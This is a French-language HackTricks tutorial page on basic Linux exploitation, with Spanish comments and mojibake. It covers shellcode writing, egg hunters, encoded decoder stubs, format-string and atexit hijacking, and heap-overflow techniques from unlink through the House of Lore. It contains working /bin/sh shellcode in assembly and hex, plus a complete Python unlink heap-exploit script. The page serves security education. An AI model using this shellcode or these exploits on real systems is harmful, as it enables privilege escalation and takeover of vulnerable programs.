# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

V√©rifiez les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyons eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter syscall

**nasm -f elf assembly.asm** ‚Äî> Nous renvoie un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nous donne un ex√©cutable form√© par le code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour voir que c'est effectivement notre shellcode et extraire les OpCodes

**V√©rifier que la shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour voir que les appels syst√®me se r√©alisent correctement, il faut compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, on peut r√©aliser une astuce. La premi√®re instruction est un jump vers un call. Le call appelle le code original et met √©galement l'EIP dans la pile. Apr√®s l'instruction call, nous avons ins√©r√© la cha√Æne dont nous avions besoin, donc avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EJ **ASTUCE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ utilisant la pile (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV :**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter :**

Consiste en un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode y √©tant stock√©e (cherche une signature plac√©e dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Consistent en des shells chiffr√©es qui ont un petit code qui les d√©chiffre et y saute, utilisant le truc de Call-Pop, ce serait un **exemple chiffr√© c√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.M√©thodes compl√©mentaires**

**Technique de Murat**

En linux tous les programmes se mappent commen√ßant √† 0xbfffffff

En voyant comment se construit la pile d'un nouveau processus en linux, on peut d√©velopper un exploit de mani√®re √† ce que le programme soit lanc√© dans un environnement dont la seule variable soit la shellcode. L'adresse de celle-ci peut alors √™tre calcul√©e comme : addr = 0xbfffffff - 4 - strlen(NOM_ex√©cutable_complet) - strlen(shellcode)

De cette mani√®re, on obtiendrait facilement l'adresse o√π se trouve la variable d'environnement avec la shellcode.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement qui n'a que les variables d'environnement souhait√©es.

##

###

###

###

###

### **Format Strings to Buffer Overflows**

Le **sprintf moves** une cha√Æne format√©e **√†** une **variable.** Par cons√©quent, vous pourriez abuser du **formatage** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, le payload `%.44xAAAA` √©crira **44B+"AAAA" dans la variable**, ce qui peut provoquer un d√©bordement de tampon.

### **\_\_atexit Structures**

{% hint style="danger" %}
De nos jours, il est tr√®s **bizarre d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es comme param√®tres.** Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** de la **main**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour pointer vers une shellcode par exemple, vous **prenez le contr√¥le** du **processus**, mais cela est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse √† laquelle elles pointent n'est pas l'adresse des fonctions, mais est **chiffr√©e avec XOR** et des d√©calages avec une **cl√© al√©atoire**. Donc, actuellement, ce vecteur d'attaque n'est **pas tr√®s utile, du moins sur x86** et **x64\_86**.\
La **fonction de chiffrement** est **`PTR_MANGLE`**. **D'autres architectures** telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de chiffrement** car elle **retourne la m√™me** que celle qu'elle a re√ßue en entr√©e. Donc, ces architectures seraient attaquables par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **bizarre d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe, c'est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc si il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier l'ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si un **√©crasement** du **VPtr** est r√©alis√©, il pourrait √™tre **modifi√©** pour **pointer** vers une m√©thode fictive afin que l'ex√©cution d'une fonction aille vers la shellcode.

## **Mesures pr√©ventives et √©vasions**

###

**Remplacement de Libsafe**

Il s'active avec : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, pas toutes les fonctions vuln√©rables ne deviennent s√©curis√©es et LD\_PRELOAD ne fonctionne pas dans les binaires avec suid).

**ASCII Armored Address Space**

Il consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne stoppe presque aucun attaque, et encore moins en little endian.

**ret2plt**

Il consiste √† r√©aliser un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction que l'on souhaite appeler (system()). Ensuite, on fait la m√™me chose en pointant vers GOT+1 et on copie le 2√®me octet de system()‚Ä¶ Enfin, on appelle l'adresse sauvegard√©e dans la GOT qui sera system().

**Cages avec chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base sous un sous-r√©pertoire sp√©cifique

Un admin peut sortir de l'une de ces cages en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Cherche des erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de tas : Exploits de base**

**Bloc allou√©**

prev\_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Bloc libre**

prev\_size |\
size |\
\*fd | Ptr bloc suivant\
\*bk | Ptr bloc pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les blocs libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux blocs libres ensemble (ils se fusionnent).

Dans ‚Äúsize‚Äù, il y a des bits pour indiquer : Si le bloc pr√©c√©dent est en usage, si le bloc a √©t√© allou√© par mmap() et si le bloc appartient √† l'ar√®ne primaire.

Si en lib√©rant un bloc, l'un des contigus est libre, ceux-ci se fusionnent par la macro unlink() et le nouveau bloc plus grand est pass√© √† frontlink() pour qu'il ins√®re le bin appropri√©.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau bloc est celui que poss√©dait le bloc qui √©tait d√©j√† libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau bloc est celui que poss√©dait le bloc qui √©tait d√©j√† libre avant\
FD->bk = BK; ‚Äî> Le BK du bloc suivant pointe vers le nouveau bloc\
BK->fd = FD; ‚Äî> Le FD du bloc pr√©c√©dent pointe vers le nouveau bloc\
}

Par cons√©quent, si nous parvenons √† modifier le P->bk avec l'adresse d'une shellcode et le P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, on r√©ussit :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Et ainsi, la shellcode s'ex√©cute √† la sortie du programme.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et la shellcode doit √™tre r√©par√©e pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet de la shellcode, donc la premi√®re instruction de la shellcode doit √™tre un jmp pour sauter cela et tomber sur des nops qui m√®nent au reste de la shellcode.

Par cons√©quent, l'exploit se cr√©e :

Dans le buffer1, nous mettons la shellcode en commen√ßant par un jmp pour qu'elle tombe sur les nops ou sur le reste de la shellcode.

Apr√®s la shellcode, nous mettons du remplissage jusqu'√† atteindre le champ prev\_size et size du bloc suivant. √Ä ces endroits, nous mettons 0xfffffff0 (de mani√®re √† ce que le prev\_size soit √©cras√© pour que le bit indiquant qu'il est libre soit √† 1) et ‚Äú-4‚Äú(0xfffffffc) dans le size (pour que lorsqu'il v√©rifie dans le 3√®me bloc si le 2√®me √©tait libre, il aille r√©ellement au prev\_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() enqu√™tera, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me bloc est libre. Et alors il appellera **unlink()**.

En appelant unlink(), il utilisera comme P->fd les premi√®res donn√©es du 2√®me bloc, donc l√† se mettra l'adresse que vous souhaitez √©craser - 12 (car dans FD->bk, il ajoutera 12 √† l'adresse sauvegard√©e dans FD). Et √† cette adresse, il introduira la deuxi√®me adresse qu'il trouvera dans le 2√®me bloc, que nous souhaitons qu'elle soit l'adresse de la shellcode (P->bk faux).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de remplissage**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le bloc pr√©c√©dent est libre soit √† 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour qu'il pense que le ‚Äúsize‚Äù du 3√®me bloc est 4 octets derri√®re (pointe vers prev\_size) car c'est l√† qu'il v√©rifie si le 2√®me bloc est libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Dans le payload, au d√©but, nous allons mettre 8 octets de remplissage**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (ce sera l'adresse qui sera √©cras√©e pour que la shellcode soit lanc√©e la 2√®me fois que free est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Comme dit, le payload commence par 8 octets de remplissage parce que oui**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #On modifie le 2√®me bloc, le got\_free pointe vers o√π nous allons sauvegarder l'adresse addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() lib√©rant dans l'ordre inverse (wargame)**

Nous contr√¥lons 3 blocs cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de leur r√©servation.

Dans ce cas :

Dans le bloc c, on met la shellcode

Le bloc a est utilis√© pour √©craser le b de mani√®re √† ce que le size ait le bit PREV\_INUSE d√©sactiv√©, de sorte qu'il pense que le bloc a est libre.

De plus, on √©crase dans l'en-t√™te b le size pour qu'il vaille -4.

Alors, le programme pensera que ‚Äúa‚Äù est libre et dans un bin, donc il appellera unlink() pour le d√©senlacer. Cependant, comme l'en-t√™te PREV\_SIZE vaut -4, il pensera que le bloc de ‚Äúa‚Äù commence r√©ellement √† b+4. C'est-√†-dire qu'il fera un unlink() √† un bloc qui commence √† b+4, donc √† b+12 se trouvera le pointeur ‚Äúfd‚Äù et √† b+16 se trouvera le pointeur ‚Äúbk‚Äù.

De cette mani√®re, si dans bk nous mettons l'adresse de la shellcode et dans fd nous mettons l'adresse de la fonction ‚Äúputs()‚Äù-12, nous avons notre payload.

**Technique de Frontlink**

On appelle frontlink lorsque quelque chose est lib√©r√© et qu'aucun de ses blocs contigus n'est libre, on n'appelle pas unlink() mais on appelle directement frontlink().

Vuln√©rabilit√© utile lorsque le malloc qui est attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un buffer qui peut d√©border avec la fonction d'entr√©e de donn√©es

Un buffer contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de son en-t√™te sera modifi√© gr√¢ce au d√©bordement du buffer pr√©c√©dent

Un buffer √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure √† celle du buffer pr√©c√©dent

Un buffer d√©clar√© avant l'√©tape 3 qui permet d'√©craser le prev\_size de celui-ci

De cette mani√®re, en r√©ussissant √† √©craser dans deux mallocs de mani√®re incontr√¥l√©e et dans un de mani√®re contr√¥l√©e mais qui ne sera lib√©r√© que celui-ci, nous pouvons faire un exploit.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Dans le cas o√π l'on souhaite r√©utiliser l'un, il serait assign√© sans probl√®me. Dans le cas o√π l'on souhaite utiliser l'autre, il se verrait assigner le m√™me espace, donc nous aurions les pointeurs ‚Äúfd‚Äù et ‚Äúbk‚Äù fauss√©s avec les donn√©es que l'ancienne r√©servation √©crira.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est utilis√© √† nouveau sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques de Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de chercher un deuxi√®me bloc qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() provoque l'appel √† public\_fREe(mem), ce qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mem); ‚Äî> Retourne un pointeur √† l'adresse o√π commence le bloc (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Dans \[1], il v√©rifie le champ size le bit NON\_MAIN\_ARENA, qui peut √™tre alt√©r√© pour que la v√©rification retourne true et ex√©cute heap\_for\_ptr() qui fait un and √† ‚Äúmem‚Äù laissant √† 0 les 2.5 bytes les moins significatifs (dans notre cas de 0x0804a000 laisse 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme si c'√©tait un struct heap\_info)

De cette mani√®re, si nous pouvons contr√¥ler un bloc par exemple √† 0x0804a000 et qu'un bloc va √™tre lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me bloc sera lib√©r√©, il se trouvera que heap\_for\_ptr(ptr)->ar\_ptr retourne ce que nous avons √©crit √† 0x08100000 (puis s'applique √† 0x081002a0 le and que nous avons vu auparavant et de l√† on obtient la valeur des 4 premiers octets, l'ar\_ptr)

De cette mani√®re, on appelle \_int\_free(ar\_ptr, mem), c'est-√†-dire, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le bloc qui va √™tre lib√©r√©.

Tel que d√©fini unsorted\_chunks, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si dans av->bins\[2] nous √©crivons la valeur de \_\_DTOR\_END\_\_-12, dans la derni√®re instruction, il sera √©crit dans \_\_DTOR\_END\_\_ l'adresse du deuxi√®me bloc.

C'est-√†-dire, dans le premier bloc, nous devons mettre au d√©but plusieurs fois l'adresse de \_\_DTOR\_END\_\_-12 car c'est de l√† qu'il obtiendra av->bins\[2]

√Ä l'adresse o√π tombera l'adresse du deuxi√®me bloc avec les derniers 5 z√©ros, nous devons √©crire l'adresse de ce premier bloc pour que heap\_for\_ptr() pense que l'ar\_ptr est au d√©but du premier bloc et en tire av->bins\[2]

Dans le deuxi√®me bloc et gr√¢ce au premier, nous √©crasons le prev\_size avec un jump 0x0c et le size avec quelque chose pour activer -> NON\_MAIN\_ARENA

Ensuite, dans le bloc 2, nous mettons un tas de nops et enfin la shellcode.

De cette mani√®re, on appellera \_int\_free(TROZO1, TROZO2) et suivra les instructions pour √©crire dans \_\_DTOR\_END\_\_ l'adresse du prev\_size du TROZO2 qui sautera √† la shellcode.

Pour appliquer cette technique, il faut que certains autres crit√®res soient remplis, ce qui complique un peu plus le payload.

Cette technique n'est plus applicable car un patch similaire √† celui de unlink a √©t√© appliqu√©. On compare si le nouveau site vers lequel on pointe lui pointe √©galement.

**Fastbin**

C'est une variante de The house of mind

Nous voulons atteindre l'ex√©cution du code suivant √† laquelle on acc√®de apr√®s la premi√®re v√©rification de la fonction \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De cette mani√®re, si l'on met dans ‚Äúfb‚Äù l'adresse d'une fonction dans la GOT, √† cette adresse sera mise l'adresse du bloc √©cras√©. Pour cela, il sera n√©cessaire que l'ar√®ne soit proche des adresses de dtors. Plus pr√©cis√©ment, que av->max\_fast soit √† l'adresse que nous allons √©craser.

√âtant donn√© qu'avec The House of Mind, nous avons vu que nous contr√¥lions la position de av.

Alors, si dans le champ size nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() nous renverra fastbins\[-1], qui pointera vers av->max\_fast

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (non pas celle √† laquelle elle pointe, mais cette position sera celle qui sera √©cras√©e).

De plus, il faut que le bloc contigu √† celui lib√©r√© soit sup√©rieur √† 8 -> √âtant donn√© que nous avons dit que la taille du bloc lib√©r√© est 8, dans ce bloc faux, nous devons simplement mettre une taille sup√©rieure √† 8 (comme de plus la shellcode ira dans le bloc lib√©r√©, il faudra mettre au d√©but un jmp qui tombe sur des nops).

De plus, ce m√™me bloc faux doit √™tre inf√©rieur √† av->system\_mem. av->system\_mem se trouve 1848 octets plus loin.

√Ä cause des nuls de \_DTOR\_END\_ et des rares adresses dans la GOT, aucune adresse de ces sections ne sert √† √™tre √©cras√©e, voyons donc comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque consiste √† rediriger le **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8, alors : fastbin\_index() nous renverra fastbins\[0] et nous pouvons en faire usage pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni valeurs √©tranges dans la pile, en fait, nous devons nous trouver dans celle-ci : 4 octets nuls + EBP + RET

Les 4 octets nuls sont n√©cessaires pour que le **av** soit √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

Le **av->max\_fast** sera l'EBP et sera une valeur qui nous servira √† contourner les restrictions.

Dans le **av->fastbins\[0]**, nous √©craserons avec l'adresse de **p** et ce sera le RET, ainsi nous sauterons √† la shellcode.

De plus, dans **av->system\_mem** (1484 octets au-dessus de la position dans la pile) il y aura beaucoup de d√©chets qui nous permettront de contourner la v√©rification qui est effectu√©e.

De plus, il faut que le bloc contigu au lib√©r√© soit sup√©rieur √† 8 -> √âtant donn√© que nous avons dit que la taille du bloc lib√©r√© est 16, dans ce bloc faux, nous devons simplement mettre une taille sup√©rieure √† 8 (comme de plus la shellcode ira dans le bloc lib√©r√©, il faudra mettre au d√©but un jmp qui tombe sur des nops qui viennent apr√®s le champ size du nouveau bloc faux).

**The House of Spirit**

Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre alt√©r√© par l'attaquant (par exemple, que le pointeur soit dans la pile sous un possible d√©bordement √† une variable).

Ainsi, nous pourrions faire en sorte que ce pointeur pointe o√π bon nous semble. Cependant, n'importe quel endroit n'est pas valide, la taille du bloc fauss√© doit √™tre inf√©rieure √† av->max\_fast et plus sp√©cifiquement √©gale √† la taille demand√©e dans un futur appel √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable, malloc(40) est appel√©, la taille du bloc faux doit √™tre √©gale √† 48.

Si par exemple le programme demandait √† l'utilisateur un nombre, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable vers les 4 octets suivants (qui pourraient appartenir √† l'EBP avec un peu de chance, ainsi le 48 reste derri√®re, comme si c'√©tait l'en-t√™te size). De plus, l'adresse ptr-4+48 doit remplir plusieurs conditions (√©tant dans ce cas ptr=EBP), c'est-√†-dire, 8 < ptr-4+48 < av->system\_mem.

Si cela est rempli, lorsque le prochain malloc que nous avons dit qui √©tait malloc(40) sera appel√©, il sera assign√© comme adresse l'adresse de l'EBP. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois l'EBP et l'EIP avec l'adresse qu'il souhaite.

Je pense que c'est parce qu'ainsi, lorsque free() le lib√©rera, il gardera √† l'esprit qu'√† l'adresse point√©e par l'EBP de la pile, il y a un bloc de taille parfaite pour le nouveau malloc() que l'on souhaite r√©server, donc il lui assigne cette adresse.

**The House of Force**

Il est n√©cessaire :

* Un d√©bordement √† un bloc qui permet d'√©craser le wilderness
* Un appel √† malloc() avec la taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est d'√©craser la taille du bloc wilderness avec une valeur tr√®s grande (0xffffffff), ainsi toute demande de m√©moire suffisamment grande sera trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La seconde est d'alt√©rer av->top pour qu'il pointe vers une zone de m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, on mettra \&EIP - 8.

Nous devons √©craser av->top pour qu'il pointe vers la zone de m√©moire sous le contr√¥le de l'attaquant :

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Victim r√©cup√®re la valeur de l'adresse du bloc wilderness actuel (l'actuel av->top) et remainder est exactement la somme de cette adresse plus la quantit√© d'octets demand√©s par malloc(). Donc, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur alt√©r√©e sera sauvegard√©e dans av->top et le prochain malloc pointera vers l'EIP et pourra l'√©craser.

Il est important de savoir que la taille du nouveau bloc wilderness soit plus grande que la demande faite par le dernier malloc(). C'est-√†-dire, si le wilderness pointe vers \&EIP-8, la taille se retrouvera juste dans le champ EBP de la pile.

**The House of Lore**

**Corruption SmallBin**

Les blocs lib√©r√©s sont introduits dans le bin en fonction de leur taille. Mais avant de les introduire, ils sont conserv√©s dans des bins non tri√©s. Un bloc est lib√©r√©, il n'est pas imm√©diatement mis dans son bin, mais reste dans des bins non tri√©s. Ensuite, si un nouveau bloc est r√©serv√© et que l'ancien lib√©r√© peut lui servir, il le renvoie, mais si un plus grand est r√©serv√©, le bloc lib√©r√© dans les bins non tri√©s est mis dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire devra √™tre sup√©rieure √† av->max\_fast (72 normalement) et inf√©rieure √† MIN\_LARGE\_SIZE (512).

Si dans les bins, il y a un bloc de la taille ad√©quate √† ce qui est demand√©, il est renvoy√© apr√®s avoir √©t√© d√©senlac√© :

bck = victim->bk; Pointe vers le bloc pr√©c√©dent, c'est la seule info que nous pouvons alt√©rer.

bin->bk = bck; L'avant-dernier bloc devient le dernier, si bck pointe vers la pile, le prochain bloc r√©serv√© se verra donner cette adresse.

bck->fd = bin; On ferme la liste en faisant pointer ce dernier vers bin.

Il est n√©cessaire :

Que deux malloc soient r√©serv√©s, de mani√®re √† ce que le premier puisse d√©border apr√®s que le second ait √©t√© lib√©r√© et introduit dans son bin (c'est-√†-dire, qu'un malloc sup√©rieur au second bloc ait √©t√© r√©serv√© avant de faire le d√©bordement)

Que le malloc r√©serv√© auquel l'adresse choisie par l'attaquant est donn√©e soit contr√¥l√© par l'attaquant.

L'objectif est le suivant, si nous pouvons faire un d√©bordement √† un tas qui a en dessous un bloc d√©j√† lib√©r√© et dans son bin, nous pouvons alt√©rer son pointeur bk. Si nous alt√©rons son pointeur bk et que ce bloc devient le premier de la liste de bin et qu'il est r√©serv√©, on trompera bin et on lui dira que le dernier bloc de la liste (le suivant √† offrir) est √† l'adresse fausse que nous avons mise (vers la pile ou la GOT par exemple). Donc, si un autre bloc est √† nouveau r√©serv√© et que l'attaquant a des permissions sur celui-ci, il se verra donner un bloc √† la position souhait√©e et pourra y √©crire.

Apr√®s avoir lib√©r√© le bloc modifi√©, il est n√©cessaire de r√©server un bloc plus grand que celui lib√©r√©, ainsi le bloc modifi√© sortira des bins non tri√©s et sera introduit dans son bin.

